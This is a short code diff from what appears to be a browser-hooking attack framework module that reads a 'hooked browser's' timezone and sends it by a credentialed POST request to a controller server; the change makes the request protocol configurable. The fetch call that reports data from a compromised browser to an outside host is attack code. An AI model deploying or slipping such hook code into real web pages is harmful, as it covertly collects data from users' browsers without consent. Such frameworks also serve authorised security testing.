@@ -7,7 +7,7 @@ Module to retrieve timezone of the hooked browser
     formData.append('result', Intl.DateTimeFormat().resolvedOptions().timeZone);
     formData.append('module_value', 'timezone.js')
 
-    fetch(`http://${server}/command/result_listener`, {
+    fetch(`${protocol}://${server}/command/result_listener`, {
         method: "POST",
         mode: 'cors',
         credentials: "include",
